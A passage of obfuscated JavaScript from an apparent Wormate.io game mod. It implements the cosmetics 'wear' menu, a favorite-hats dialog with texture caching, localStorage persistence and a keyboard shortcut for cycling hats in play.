          _0x1c97c7.bo.io.fadeOut(50);
          _0x1c97c7.bo.ko.stop();
          _0x1c97c7.bo.ko.fadeOut(50);
          _0x1c97c7.bo.jo.stop();
          _0x1c97c7.bo.jo.fadeOut(50);
          _0x1c97c7.bo.lo.stop();
          _0x1c97c7.bo.lo.fadeOut(50);
          _0x1c97c7.bo.mo.stop();
          _0x1c97c7.bo.mo.fadeIn(200);
          _0x1c97c7.bo.no.stop();
          _0x1c97c7.bo.no.fadeOut(50);
          _0x1c97c7.bo.oo.stop();
          _0x1c97c7.bo.oo.fadeOut(50);
          _0x1c97c7.bo.po.stop();
          _0x1c97c7.bo.po.fadeOut(50);
        };
        _0x881efd.prototype.Hk = function () {
          _0xf1d21a().Ci.Ce();
        };
        return _0x881efd;
      }();
      _0x1c97c7.nk = function () {
        var _0x551eea = $("#wear-view-canv");
        var _0x4043fd = $("#wear-description-text");
        var _0x38466d = $("#wear-locked-bar");
        var _0x5c661d = $("#wear-locked-bar-text");
        var _0x34dec7 = $("#wear-buy-button");
        var _0x42fd92 = $("#wear-item-price");
        var _0x5bf917 = $("#wear-eyes-button");
        var _0x2d4dfe = $("#wear-mouths-button");
        var _0x50d1af = $("#wear-glasses-button");
        var _0x47c065 = $("#wear-hats-button");
        var _0xae159f = $("#wear-tint-chooser");
        var _0x156f24 = $("#wear-view-prev");
        var _0x4265f9 = $("#wear-view-next");
        var _0x55d57a = _0x503ed4.M(_0x1c97c7.bo, function () {
          var _0x1be34a = this;
          _0x1c97c7.bo.call(this, _0x503ed4.H("index.game.popup.menu.wear.tab"), true);
          var _0x564ad4 = _0xf1d21a();
          var _0x1b962b = this;
          this.Zo = [];
          this.uj = new _0x536521(this, _0x1c97c7.tj.uj, _0x5bf917);
          this.vj = new _0x536521(this, _0x1c97c7.tj.vj, _0x2d4dfe);
          this.xj = new _0x536521(this, _0x1c97c7.tj.xj, _0x50d1af);
          this.wj = new _0x536521(this, _0x1c97c7.tj.wj, _0x47c065);
          this.$o = null;
          this._o = null;
          this.ap = null;
          this.bp = null;
          this.cp = null;
          this.dp = null;
          this.Ko = new _0x1c97c7.dm(_0x551eea);
          _0x34dec7.click(function () {
            _0x564ad4.Ci.Be();
            _0x1b962b.ep();
          });
          _0x156f24.click(function () {
            _0x564ad4.Ci.Be();
            _0x1b962b.$o.fp();
          });
          _0x4265f9.click(function () {
            _0x564ad4.Ci.Be();
            _0x1b962b.$o.gp();
          });
          _0x5bf917.click(function () {
            _0x564ad4.Ci.Be();
            _0x1b962b.hp(_0x1be34a.uj);
          });
          _0x2d4dfe.click(function () {
            _0x564ad4.Ci.Be();
            _0x1b962b.hp(_0x1be34a.vj);
          });
          _0x50d1af.click(function () {
            _0x564ad4.Ci.Be();
            _0x1b962b.hp(_0x1be34a.xj);
          });
          _0x47c065.click(function () {
            _0x564ad4.Ci.Be();
            _0x1b962b.hp(_0x1be34a.wj);
          });
          this.Zo.push(this.uj);
          this.Zo.push(this.vj);
          this.Zo.push(this.xj);
          this.Zo.push(this.wj);
        });
        _0x55d57a.prototype.ha = function () {
          _0x55d57a.parent.prototype.ha.call(this);
          var _0x2918d0 = _0xf1d21a();
          var _0x2b28db = this;
          _0x2918d0.Lc.$b(function () {
            var _0x4399f8 = _0x2918d0.Lc.Xb();
            _0x2b28db._o = _0x4399f8.eyesDict;
            _0x2b28db.ap = _0x4399f8.mouthDict;
            _0x2b28db.bp = _0x4399f8.glassesDict;
            _0x2b28db.cp = _0x4399f8.hatDict;
            _0x2b28db.dp = _0x4399f8.colorDict;
            _0x2b28db.uj.ip(_0x4399f8.eyesVariantArray);
            _0x2b28db.uj.jp(_0x2b28db._o);
            _0x2b28db.vj.ip(_0x4399f8.mouthVariantArray);
            _0x2b28db.vj.jp(_0x2b28db.ap);
            _0x2b28db.xj.ip(_0x4399f8.glassesVariantArray);
            _0x2b28db.xj.jp(_0x2b28db.bp);
            _0x2b28db.wj.ip(_0x4399f8.hatVariantArray);
            _0x2b28db.wj.jp(_0x2b28db.cp);
          });
          this.Po(false);
          _0x2918d0.On.zj(function () {
            _0x2b28db.Po(false);
          });
        };
        _0x55d57a.prototype.qo = function () {
          _0x1c97c7.bo.go.stop();
          _0x1c97c7.bo.go.fadeOut(50);
          _0x1c97c7.bo.ho.stop();
          _0x1c97c7.bo.ho.fadeOut(50);
          _0x1c97c7.bo.io.stop();
          _0x1c97c7.bo.io.fadeOut(50);
          _0x1c97c7.bo.ko.stop();
          _0x1c97c7.bo.ko.fadeOut(50);
          _0x1c97c7.bo.jo.stop();
          _0x1c97c7.bo.jo.fadeOut(50);
          _0x1c97c7.bo.lo.stop();
          _0x1c97c7.bo.lo.fadeOut(50);
          _0x1c97c7.bo.mo.stop();
          _0x1c97c7.bo.mo.fadeOut(50);
          _0x1c97c7.bo.no.stop();
          _0x1c97c7.bo.no.fadeIn(200);
          _0x1c97c7.bo.oo.stop();
          _0x1c97c7.bo.oo.fadeOut(50);
          _0x1c97c7.bo.po.stop();
          _0x1c97c7.bo.po.fadeOut(50);
        };
        _0x55d57a.prototype.Hk = function () {
          _0xf1d21a().Ci.pe(_0x1c97c7.ge.je._e);
          _0xf1d21a().Ci.Ce();
          this.hp(this.$o ?? this.uj);
          this.Ko.Kf(true);
        };
        _0x55d57a.prototype.Bk = function () {
          this.Ko.Kf(false);
        };
        _0x55d57a.prototype.Jf = function () {
          this.Ko.Jf();
        };
        _0x55d57a.prototype.Nf = function (_0x1d5e7d, _0x13ee32) {
          this.Ko.Nf();
        };
        _0x55d57a.prototype.hp = function (_0x2961ed) {
          this.$o = _0x2961ed;
          for (var _0x282c80 = 0; _0x282c80 < this.Zo.length; _0x282c80++) {
            this.Zo[_0x282c80].Ao.removeClass("pressed");
          }
          this.$o.Ao.addClass("pressed");
          this.$o.Gk();
        };
        _0x55d57a.prototype.kp = function () {
          if (this.$o == null) {
            return _0x1c97c7.Si.Ui();
          } else {
            return _0x1c97c7.Si.Vi({
              ae: this.$o.Wo(),
              nd: this.$o.nd
            });
          }
        };
        _0x55d57a.prototype.ep = function () {
          var _0x21b02b = this;
          var _0xe2ea79 = this.kp();
          if (_0xe2ea79.Wi()) {
            var _0x472e9e = _0xe2ea79.bc();
            _0x21b02b.lp(_0x472e9e.ae, _0x472e9e.nd);
          }
        };
        _0x55d57a.prototype.lp = function (_0x2c910b, _0x39a031) {
          var _0x310325 = _0xf1d21a();
          var _0x2b7095 = _0x310325.On.Gj(_0x2c910b, _0x39a031);
          if (_0x2b7095 != null) {
            var _0x1a8002 = _0x2b7095.Jj();
            if (!(_0x310325.Ij.il() < _0x1a8002)) {
              var _0x1100b2 = _0x310325.On.rj(_0x1c97c7.tj.sj);
              var _0x2acd5e = _0x310325.On.rj(_0x1c97c7.tj.uj);
              var _0x5a9c54 = _0x310325.On.rj(_0x1c97c7.tj.vj);
              var _0x1f2ef8 = _0x310325.On.rj(_0x1c97c7.tj.xj);
              var _0x41a122 = _0x310325.On.rj(_0x1c97c7.tj.wj);
              var _0x312265 = this.ro(5000);
              _0x310325.Ij.Hl(_0x2c910b, _0x39a031, function () {
                _0x312265.vo();
                _0x310325.og.Ak(_0x310325.og.tk);
              }, function (_0x3415d1) {
                _0x310325.Ij.Bl(function () {
                  _0x310325.On.Fj(_0x1100b2, _0x1c97c7.tj.sj);
                  _0x310325.On.Fj(_0x2acd5e, _0x1c97c7.tj.uj);
                  _0x310325.On.Fj(_0x5a9c54, _0x1c97c7.tj.vj);
                  _0x310325.On.Fj(_0x1f2ef8, _0x1c97c7.tj.xj);
                  _0x310325.On.Fj(_0x41a122, _0x1c97c7.tj.wj);
                  _0x310325.On.Fj(_0x2c910b, _0x39a031);
                  _0x312265.vo();
                });
              });
            }
          }
        };
        window.globalHatTextureCache = window.globalHatTextureCache || {};
        _0x55d57a.prototype.Po = function (_0x57ccbd) {
          if (!$("#wear-view").length || $("#wear-view").is(":hidden")) {
            return;
          }
          var _0x1ac2d7 = _0xf1d21a();
          var _0x1cbc52 = _0x1ac2d7.On.yj();
          var _0x5e17c0 = this.kp();
          if (_0x5e17c0.Wi()) {
            var _0x1abaad = _0x5e17c0.bc();
            var _0x47c185 = _0x1ac2d7.On.Gj(_0x1abaad.ae, _0x1abaad.nd);
            var _0x65e8b7 = false;
            var _0x3bf5fe = _0x1ac2d7.On.Cj(_0x1abaad.ae, _0x1abaad.nd);
            if (!vps.selectedHats) {
              vps.selectedHats = [];
            }
            if (_0x3bf5fe) {
              _0x38466d.hide();
              _0x34dec7.hide();
              if (_0x1abaad.nd === "HAT") {
                this.addSelectedHatButton(_0x1abaad.ae);
              } else {
                this.removeHatButtons();
              }
            } else if (_0x47c185 == null || _0x47c185.Kj()) {
              _0x65e8b7 = true;
              _0x38466d.show();
              _0x34dec7.hide();
              _0x5c661d.text(_0x503ed4.H("index.game.popup.menu.store.locked"));
              if (_0x47c185 != null && _0x47c185.Kj()) {
                var _0x52bf78 = _0x1ac2d7.Lc.Xb().textDict[_0x47c185.Em()];
                if (_0x52bf78 != null) {
                  _0x5c661d.text(_0x503ed4.I(_0x52bf78));
                }
              }
              this.removeHatButtons();
            } else {
              _0x38466d.hide();
              _0x34dec7.show();
              _0x42fd92.html(_0x47c185.Jj());
              this.removeHatButtons();
            }
            _0x4043fd.html("");
            if (_0x47c185 != null && _0x47c185.Fm() != null) {
              var _0x200f27 = _0x1ac2d7.Lc.Xb().textDict[_0x47c185.Fm()];
              if (_0x200f27 != null) {
                _0x4043fd.html(_0x503ed4.K(_0x503ed4.I(_0x200f27)));
              }
            }
            var _0x1c2491 = this.Ko;
            switch (_0x1abaad.nd) {
              case _0x1c97c7.tj.uj:
                _0x1c2491.$l(_0x1cbc52.Vm(_0x1abaad.ae));
                _0x1c2491.vm(_0x65e8b7);
                break;
              case _0x1c97c7.tj.vj:
                _0x1c2491.$l(_0x1cbc52.Wm(_0x1abaad.ae));
                _0x1c2491.wm(_0x65e8b7);
                break;
              case _0x1c97c7.tj.xj:
                _0x1c2491.$l(_0x1cbc52.Ym(_0x1abaad.ae));
                _0x1c2491.ym(_0x65e8b7);
                break;
              case _0x1c97c7.tj.wj:
                _0x1c2491.$l(_0x1cbc52.Xm(_0x1abaad.ae));
                _0x1c2491.xm(_0x65e8b7);
            }
            if (_0x57ccbd) {
              _0x1ac2d7.On.Fj(_0x1abaad.ae, _0x1abaad.nd);
            }
          }
        };
        _0x55d57a.prototype.addSelectedHatButton = function (_0x51d896) {
          this.currentHatId = _0x51d896;
          if (!this.hatButtonContainer) {
            this.hatButtonContainer = $("<div>").attr("id", "hat-button-container").css({
              position: "absolute",
              bottom: "30px",
              left: "-10px",
              display: "flex",
              gap: "5px"
            }).appendTo("#wear-view");
            this.hatToggleButton = $("<button>").attr("id", "hat-toggle-button").css({
              padding: "5px 10px",
              "background-color": "#4CAF50",
              color: "white",
              border: "none",
              "border-radius": "4px",
              cursor: "pointer",
              "min-width": "32px"
            }).appendTo(this.hatButtonContainer);
            this.hatFavoritesButton = $("<button>").attr("id", "hat-favorites-button").css({
              padding: "5px 10px",
              "background-color": "#2196F3",
              color: "white",
              border: "none",
              "border-radius": "4px",
              cursor: "pointer"
            }).text("☰ Favorites").appendTo(this.hatButtonContainer);
            this.hatInfoText = $("<div>").attr("id", "hat-info-text").css({
              position: "absolute",
              bottom: "10px",
              left: "-5px",
              "font-size": "12px",
              color: "#fff"
            }).text("Press '( 2 )' to toggle hats during gameplay").appendTo("#wear-view");
            var _0x5d256d = this;
            this.hatFavoritesButton.on("click", function () {
              _0x5d256d.showFavoritesDialog();
            });
          }
          let _0x2827d0 = vps.selectedHats.includes(_0x51d896);
          this.hatToggleButton.text(_0x2827d0 ? "X" : "★ Add");
          this.hatToggleButton.css("background-color", _0x2827d0 ? "#f44336" : "#4CAF50");
          this.hatToggleButton.off("click");
          var _0x5d256d = this;
          this.hatToggleButton.on("click", function () {
            let _0x7614ee = vps.selectedHats.indexOf(_0x51d896);
            if (_0x7614ee >= 0) {
              vps.selectedHats.splice(_0x7614ee, 1);
              $(this).text("★ Add").css("background-color", "#4CAF50");
            } else {
              vps.selectedHats.push(_0x51d896);
              $(this).text("X").css("background-color", "#f44336");
            }
            localStorage.setItem("SaveGameup", JSON.stringify(vps));
            localStorage.setItem("SaveGamewup", JSON.stringify(vps));
          });
          this.hatButtonContainer.show();
          this.hatInfoText.show();
        };
        _0x55d57a.prototype.removeHatButtons = function () {
          if (this.hatButtonContainer) {
            this.hatButtonContainer.hide();
          }
          if (this.hatInfoText) {
            this.hatInfoText.hide();
          }
        };
        function _0x244168(_0x1d848b) {
          try {
            if (window.globalHatTextureCache && window.globalHatTextureCache[_0x1d848b] && window.globalHatTextureCache[_0x1d848b].valid) {
              return window.globalHatTextureCache[_0x1d848b];
            }
            if (!window._wup || !window._wup._anApp || !window._wup._anApp.Lc || !window._wup._anApp.Lc.Xb()) {
              return null;
            }
            const _0x728668 = window._wup._anApp.Lc.Xb();
            if (!_0x728668.hatDict || !_0x728668.regionDict || !_0x728668.textureDict) {
              return null;
            }
            const _0x1e0db8 = _0x728668.hatDict[_0x1d848b];
            if (!_0x1e0db8 || !_0x1e0db8.base || !_0x1e0db8.base.length) {
              return null;
            }
            const _0x3b7439 = _0x1e0db8.base[0];
            const _0x3758b5 = _0x3b7439.region;
            const _0x3d9cdb = _0x728668.regionDict[_0x3758b5];
            if (!_0x3d9cdb) {
              return null;
            }
            const _0x24e22d = _0x728668.textureDict[_0x3d9cdb.texture];
            if (!_0x24e22d) {
              return null;
            }
            if (!window.globalHatTextureCache) {
              window.globalHatTextureCache = {};
            }
            const _0x4dde6c = new Image();
            _0x4dde6c.crossOrigin = "anonymous";
            const _0x3c3e39 = {
              hatId: _0x1d848b,
              image: null,
              coords: {
                x: _0x3d9cdb.x || 0,
                y: _0x3d9cdb.y || 0,
                width: _0x3d9cdb.w || 0,
                height: _0x3d9cdb.h || 0
              },
              valid: false,
              loading: true
            };
            _0x4dde6c.onload = function () {
              _0x3c3e39.image = _0x4dde6c;
              _0x3c3e39.valid = true;
              _0x3c3e39.loading = false;
              window.globalHatTextureCache[_0x1d848b] = _0x3c3e39;
            };
            _0x4dde6c.onerror = function () {
              _0x3c3e39.loading = false;
              _0x3c3e39.valid = false;
            };
            let _0x3cca3a = _0x24e22d.relativePath || _0x24e22d.url;
            if (_0x3cca3a && _0x3cca3a.startsWith("/")) {
              if (_0x3cca3a.includes("wup_")) {
                _0x3cca3a = window.vps?.s_l + _0x3cca3a;
              } else {
                _0x3cca3a = "https://resources.wormate.io" + _0x3cca3a;
              }
            }
            _0x4dde6c.src = _0x3cca3a;
            window.globalHatTextureCache[_0x1d848b] = _0x3c3e39;
            return _0x3c3e39;
          } catch (_0x5999b4) {
            return null;
          }
        }
        function _0x5786c6() {
          if (!vps.selectedHats || vps.selectedHats.length === 0) {
            return;
          }
          vps.selectedHats.forEach(function (_0x3a9aea) {
            setTimeout(function () {
              _0x244168(_0x3a9aea);
            }, Math.random() * 1000);
          });
        }
        _0x55d57a.prototype.showFavoritesDialog = function () {
          _0x5786c6();
        };
        function _0x2dae3b(_0x386920) {
          try {
            const _0x24f4c = document.createElement("div");
            _0x24f4c.style.cssText = "\n                    width: 100%; height: 100%; position: relative;\n                    overflow: visible; display: flex; justify-content: center;\n                    align-items: center;\n                ";
            const _0x412c6d = document.createElement("div");
            _0x412c6d.textContent = "#" + _0x386920;
            _0x412c6d.style.cssText = "\n                    position: absolute; top: 4px; left: 4px;\n                    background-color: rgba(0,0,0,0.6); color: white;\n                    font-size: 12px; padding: 2px 5px; border-radius: 3px; z-index: 10;\n                ";
            _0x24f4c.appendChild(_0x412c6d);
            const _0x3654b6 = document.createElement("canvas");
            _0x3654b6.width = 80;
            _0x3654b6.height = 80;
            _0x3654b6.style.cssText = "display: block; object-fit: contain;";
            _0x24f4c.appendChild(_0x3654b6);
            const _0x32022b = _0x3654b6.getContext("2d");
            _0x32022b.clearRect(0, 0, _0x3654b6.width, _0x3654b6.height);
            const _0x2b8dbf = _0x244168(_0x386920);
            if (!_0x2b8dbf) {
              _0x32022b.fillStyle = "#333";
              _0x32022b.fillRect(0, 0, _0x3654b6.width, _0x3654b6.height);
              _0x32022b.fillStyle = "white";
              _0x32022b.font = "18px Arial";
              _0x32022b.textAlign = "center";
              _0x32022b.fillText("#" + _0x386920, _0x3654b6.width / 2, _0x3654b6.height / 2);
              return _0x24f4c;
            }
            if (_0x2b8dbf.loading) {
              _0x32022b.fillStyle = "#555";
              _0x32022b.fillRect(0, 0, _0x3654b6.width, _0x3654b6.height);
              _0x32022b.fillStyle = "white";
              _0x32022b.font = "12px Arial";
              _0x32022b.textAlign = "center";
              _0x32022b.fillText("Loading...", _0x3654b6.width / 2, _0x3654b6.height / 2);
              const _0x553b59 = setInterval(() => {
                if (_0x2b8dbf.valid && _0x2b8dbf.image) {
                  clearInterval(_0x553b59);
                  _0x1fabe5(_0x32022b, _0x2b8dbf, _0x3654b6.width, _0x3654b6.height);
                } else if (!_0x2b8dbf.loading) {
                  clearInterval(_0x553b59);
                  _0x32022b.fillStyle = "#333";
                  _0x32022b.fillRect(0, 0, _0x3654b6.width, _0x3654b6.height);
                  _0x32022b.fillStyle = "white";
                  _0x32022b.font = "18px Arial";
                  _0x32022b.textAlign = "center";
                  _0x32022b.fillText("#" + _0x386920, _0x3654b6.width / 2, _0x3654b6.height / 2);
                }
              }, 100);
            } else if (_0x2b8dbf.valid && _0x2b8dbf.image) {
              _0x1fabe5(_0x32022b, _0x2b8dbf, _0x3654b6.width, _0x3654b6.height);
            } else {
              _0x32022b.fillStyle = "#333";
              _0x32022b.fillRect(0, 0, _0x3654b6.width, _0x3654b6.height);
              _0x32022b.fillStyle = "white";
              _0x32022b.font = "18px Arial";
              _0x32022b.textAlign = "center";
              _0x32022b.fillText("#" + _0x386920, _0x3654b6.width / 2, _0x3654b6.height / 2);
            }
            return _0x24f4c;
          } catch (_0x9dc173) {
            return _0x31b329(_0x386920);
          }
        }
        function _0x1fabe5(_0x5ba50d, _0x4a5cb3, _0x21bd2e, _0xe15bba) {
          if (_0x4a5cb3.coords) {
            const _0x2a4f17 = Math.min((_0x21bd2e - 10) / _0x4a5cb3.coords.width, (_0xe15bba - 10) / _0x4a5cb3.coords.height) * 0.9;
            const _0x5a563c = _0x4a5cb3.coords.width * _0x2a4f17;
            const _0x5ee9fa = _0x4a5cb3.coords.height * _0x2a4f17;
            const _0x5a2d7f = (_0x21bd2e - _0x5a563c) / 2;
            const _0x47b8fc = (_0xe15bba - _0x5ee9fa) / 2;
            _0x5ba50d.clearRect(0, 0, _0x21bd2e, _0xe15bba);
            _0x5ba50d.drawImage(_0x4a5cb3.image, _0x4a5cb3.coords.x, _0x4a5cb3.coords.y, _0x4a5cb3.coords.width, _0x4a5cb3.coords.height, _0x5a2d7f, _0x47b8fc, _0x5a563c, _0x5ee9fa);
          }
        }
        function _0x31b329(_0x2f4813) {
          const _0x449f5a = document.createElement("div");
          _0x449f5a.style.cssText = "\n                width: 100%; height: 100%; display: flex;\n                justify-content: center; align-items: center;\n                color: white; background-color: #333;\n            ";
          _0x449f5a.textContent = "#" + _0x2f4813;
          return _0x449f5a;
        }
        _0x55d57a.prototype.showFavoritesDialog = function () {
          $("#favorites-dialog, #favorites-overlay").remove();
          var _0x37d976 = $("<div>").attr("id", "favorites-overlay").css({
            position: "fixed",
            top: "0",
            left: "0",
            width: "100%",
            height: "100%",
            "background-color": "rgba(0, 0, 0, 0.5)",
            "z-index": "999"
          }).appendTo("body");
          var _0x551936 = $("<div>").attr("id", "favorites-dialog").css({
            position: "fixed",
            top: "50%",
            left: "50%",
            transform: "translate(-50%, -50%)",
            "background-color": "#1e1e2f",
            "border-radius": "8px",
            "box-shadow": "0 4px 8px rgba(0, 0, 0, 0.5)",
            "z-index": "1000",
            width: "500px",
            overflow: "hidden",
            color: "white"
          }).appendTo("body");
          var _0x25dfdf = $("<div>").css({
            padding: "15px 20px",
            "background-color": "#252538",
            "border-bottom": "1px solid #333345",
            position: "relative",
            display: "flex",
            "justify-content": "space-between",
            "align-items": "center"
          }).appendTo(_0x551936);
          $("<h3>").text("Favorite Hats").css({
            margin: "0 0 0 5px",
            "font-size": "18px",
            color: "white",
            "padding-left": "15px"
          }).appendTo(_0x25dfdf);
          var _0x400f67 = $("<button>").html("&times;").css({
            position: "absolute",
            top: "8px",
            left: "10px",
            "font-size": "22px",
            background: "none",
            border: "none",
            color: "#aaa",
            cursor: "pointer",
            padding: "0 5px",
            "line-height": "1",
            "font-weight": "bold"
          }).appendTo(_0x25dfdf);
          var _0x48c9e8 = $("<button>").text("Clear All").css({
            padding: "4px 8px",
            "background-color": "#f44336",
            color: "white",
            border: "none",
            "border-radius": "4px",
            cursor: "pointer",
            "font-size": "12px"
          }).appendTo(_0x25dfdf);
          var _0x11492e = $("<div>").attr("id", "favorites-content").css({
            padding: "15px 20px",
            "max-height": "420px",
            "overflow-y": "auto"
          }).appendTo(_0x551936);
          var _0x21c633 = $("<div>").attr("class", "favorites-grid").css({
            display: "grid",
            "grid-template-columns": "1fr 1fr 1fr",
            gap: "12px",
            padding: "0",
            margin: "0"
          }).appendTo(_0x11492e);
          var _0x2af0a4 = this;
          _0x48c9e8.on("click", function () {
            if (confirm("Are you sure you want to remove all favorite hats?")) {
              vps.selectedHats = [];
              localStorage.setItem("SaveGameup", JSON.stringify(vps));
              localStorage.setItem("SaveGamewup", JSON.stringify(vps));
              _0x21c633.empty();
              $("<div>").css({
                "text-align": "center",
                padding: "10px",
                color: "#aaa",
                margin: "20px 0",
                "grid-column": "1 / span 3"
              }).text("You don't have any favorite hats yet.").appendTo(_0x21c633);
              if (_0x2af0a4.hatToggleButton && _0x2af0a4.hatToggleButton.is(":visible")) {
                _0x2af0a4.hatToggleButton.text("★ Add").css("background-color", "#4CAF50");
              }
            }
          });
          function _0x1cd393() {
            _0x551936.remove();
            _0x37d976.remove();
          }
          _0x400f67.on("click", _0x1cd393);
          _0x37d976.on("click", _0x1cd393);
          if (!vps.selectedHats || vps.selectedHats.length === 0) {
            $("<div>").css({
              "text-align": "center",
              padding: "10px",
              color: "#aaa",
              margin: "20px 0",
              "grid-column": "1 / span 3"
            }).text("You don't have any favorite hats yet.").appendTo(_0x21c633);
          } else {
            vps.selectedHats.forEach(function (_0x31b9a8) {
              _0x244168(_0x31b9a8);
            });
            vps.selectedHats.forEach(function (_0x354da7, _0x3570e1) {
              var _0x520fe0 = $("<div>").attr("data-index", _0x3570e1).attr("data-hat-id", _0x354da7).css({
                display: "flex",
                "flex-direction": "column",
                "align-items": "center",
                padding: "2px",
                background: "#252538",
                "border-radius": "6px",
                position: "relative",
                height: "87px",
                width: "100%"
              }).appendTo(_0x21c633);
              var _0x1fa7dc = $("<div>").css({
                width: "100%",
                height: "82px",
                background: "transparent",
                "border-radius": "4px",
                overflow: "visible",
                position: "relative",
                display: "flex",
                "justify-content": "center",
                "align-items": "center"
              }).appendTo(_0x520fe0);
              var _0x45add1 = $("<button>").text("X").css({
                position: "absolute",
                top: "4px",
                right: "4px",
                background: "#f44336",
                color: "white",
                border: "none",
                padding: "2px 6px",
                "border-radius": "3px",
                cursor: "pointer",
                "font-size": "12px",
                "z-index": "20"
              }).appendTo(_0x520fe0);
              var _0x5969f8 = _0x2dae3b(_0x354da7);
              _0x1fa7dc.append(_0x5969f8);
              _0x45add1.on("click", function (_0x339f36) {
                _0x339f36.stopPropagation();
                var _0x47a2d1 = $(this).closest("[data-index]");
                var _0x558a0a = parseInt(_0x47a2d1.attr("data-index"));
                var _0x79b32c = _0x47a2d1.attr("data-hat-id");
                if (vps.selectedHats && _0x558a0a >= 0 && _0x558a0a < vps.selectedHats.length) {
                  vps.selectedHats.splice(_0x558a0a, 1);
                  localStorage.setItem("SaveGameup", JSON.stringify(vps));
                  localStorage.setItem("SaveGamewup", JSON.stringify(vps));
                  _0x47a2d1.fadeOut(300, function () {
                    $(this).remove();
                    _0x21c633.find("[data-index]").each(function (_0x539397) {
                      $(this).attr("data-index", _0x539397);
                    });
                    if (vps.selectedHats.length === 0) {
                      _0x21c633.empty();
                      $("<div>").css({
                        "text-align": "center",
                        padding: "10px",
                        color: "#aaa",
                        margin: "20px 0",
                        "grid-column": "1 / span 3"
                      }).text("You don't have any favorite hats yet.").appendTo(_0x21c633);
                    }
                    if (_0x2af0a4.currentHatId === _0x79b32c && _0x2af0a4.hatToggleButton) {
                      _0x2af0a4.hatToggleButton.text("★ Add").css("background-color", "#4CAF50");
                    }
                  });
                }
              });
            });
          }
        };
        function _0x2db106(_0x2e0394) {
          try {
            if (_wup && _wup._anApp && _wup._anApp.dh && _wup._anApp.dh.ch) {
              _wup._anApp.dh.ch.Eh.qi = _0x2e0394;
              try {
                if (_wup._anApp.dh.ch.Nm && _wup._anApp.dh.ch.Nm.yc) {
                  _wup._anApp.dh.ch.Nm.yc(_wup._anApp.dh.hh.xg, _wup._anApp.Lc.Ub().jb(_wup._anApp.dh.ch.Eh.Gh), _wup._anApp.Lc.Ub().ib(_wup._anApp.dh.ch.Eh.Hh), _wup._anApp.Lc.Ub().kb(_wup._anApp.dh.ch.Eh.ni), _wup._anApp.Lc.Ub().lb(_wup._anApp.dh.ch.Eh.oi), _wup._anApp.Lc.Ub().mb(_wup._anApp.dh.ch.Eh.pi), _wup._anApp.Lc.Ub().nb(_0x2e0394), "#ffffff");
                } else {
                  _wup._anApp.dh.ch.Sm();
                }
                return true;
              } catch (_0x58ffc2) {
                console.error("❌ Error rebuilding character:", _0x58ffc2);
                return false;
              }
            }
            return false;
          } catch (_0x42fdac) {
            console.error("❌ Error changing hat:", _0x42fdac);
            return false;
          }
        }
        function _0x381203(_0x13078d) {
          if (_0x13078d.Zc && _0x13078d.Zc.rd) {
            return _0x13078d.Zc.rd;
          }
          return null;
        }
        function _0x5ca1e9(_0xe857dd, _0x50082a) {
          if (_0xe857dd && _0xe857dd.length > 0) {
            const _0x5f4f56 = _0xf1d21a().Lc.Cc().Yb(_0x50082a);
            if (_0x5f4f56 && _0x5f4f56.dc && _0x5f4f56.dc.length > 0) {
              try {
                _0xe857dd[0].kd(_0x5f4f56.dc[0]);
                return true;
              } catch (_0x5ee777) {}
            }
          }
          return false;
        }
        function _0x365ecf(_0x2fdccc, _0x225f6b) {
          if (_0x2fdccc && _0x2fdccc.Zc && _0x225f6b) {
            try {
              _0x2fdccc.Zc.yd(0.004, _0x2fdccc.Zc.rd, _0x225f6b);
              return true;
            } catch (_0x5f450e) {}
          }
          return false;
        }
        function _0x451418() {
          if (!vps.selectedHats) {
            vps.selectedHats = [];
            localStorage.setItem("SaveGameup", JSON.stringify(vps));
            localStorage.setItem("SaveGamewup", JSON.stringify(vps));
            return;
          }
          if (vps.selectedHats.length > 0) {
            if (vps.currentHatIndex === undefined) {
              vps.currentHatIndex = 0;
            } else {
              vps.currentHatIndex = (vps.currentHatIndex + 1) % vps.selectedHats.length;
            }
            let _0x56a361 = vps.selectedHats[vps.currentHatIndex];
            const _0x5ae644 = _0x2db106(_0x56a361);
            localStorage.setItem("SaveGameup", JSON.stringify(vps));
            localStorage.setItem("SaveGamewup", JSON.stringify(vps));
          }
        }
        function _0x112748() {
          if (window.hatCyclingInitialized) {
            return;
          }
          $(document).on("keydown", function (_0x47efa0) {
            if (_0x47efa0.keyCode === 50 || _0x47efa0.which === 50) {
              _0x451418();
            }
          });
          window.hatCyclingInitialized = true;
        }
        function _0x6974b6() {
          if (!vps.selectedHats || vps.selectedHats.length === 0) {
            return;
          }
          vps.selectedHats.forEach(function (_0x55ddc1) {
            _0x244168(_0x55ddc1);
          });
        }
        $(document).ready(function () {
          setTimeout(function () {
            _0x112748();
            _0x6974b6();
            if (typeof vps === "undefined") {
              window.vps = {};
            }
            if (!vps.selectedHats) {
              vps.selectedHats = [];
            }
            window.openHatFavorites = function () {
              if (_0x55d57a.prototype.showFavoritesDialog) {
                var _0x354e88 = new _0x55d57a();
                _0x354e88.showFavoritesDialog();
              }
            };
            window.toggleHat = function () {
              _0x451418();
            };
            window.addCurrentHatToFavorites = function () {};
          }, 1000);
        });
        function _0x22008a() {
          if (window.globalHatTextureCache) {
            var _0x33f539 = Object.keys(window.globalHatTextureCache);
            if (_0x33f539.length > 50) {
              var _0x2a3d27 = _0x33f539.slice(0, _0x33f539.length - 30);
              _0x2a3d27.forEach(function (_0x3cbaef) {
                delete window.globalHatTextureCache[_0x3cbaef];
              });
            }
          }
        }
        window.addEventListener("load", function () {
          setTimeout(function () {
            _0x6974b6();
            _0x22008a();
          }, 2000);
        });
        setInterval(function () {
          _0x22008a();
        }, 300000);
        function _0x46cfd1() {
          try {
            const _0x308f04 = [];
            const _0x48b5a2 = _0xf1d21a();
            const _0x59c9ff = _0x48b5a2.Lc.Cc();
            if (!_0x59c9ff) {
              return _0x308f04;
            }
            for (let _0x4f429b in _0x59c9ff.Vb) {
              if (_0x59c9ff.Vb.hasOwnProperty(_0x4f429b)) {
                _0x308f04.push(_0x4f429b);
              }
            }
            return _0x308f04;
          } catch (_0x1fa796) {
            console.log("Error getting available hats:", _0x1fa796);
            return [];
          }
        }
        function _0x3beae2() {
          try {
            const _0x139519 = _0xf1d21a();
            if (_0x139519 && _0x139519.Mh && _0x139519.Mh.Lh && _0x139519.Mh.Lh.ki) {
              return {
                currentHatId: _0x139519.Mh.Lh.ki.Yi,
                isInFavorites: vps.selectedHats ? vps.selectedHats.includes(_0x139519.Mh.Lh.ki.Yi) : false
              };
            }
          } catch (_0x47a25e) {
            console.log("Error getting current hat info:", _0x47a25e);
          }
          return {
            currentHatId: null,
            isInFavorites: false
          };
        }
        function _0x10e358(_0x5a71f8, _0x2c8452 = "info") {
          $("#hat-notification").remove();
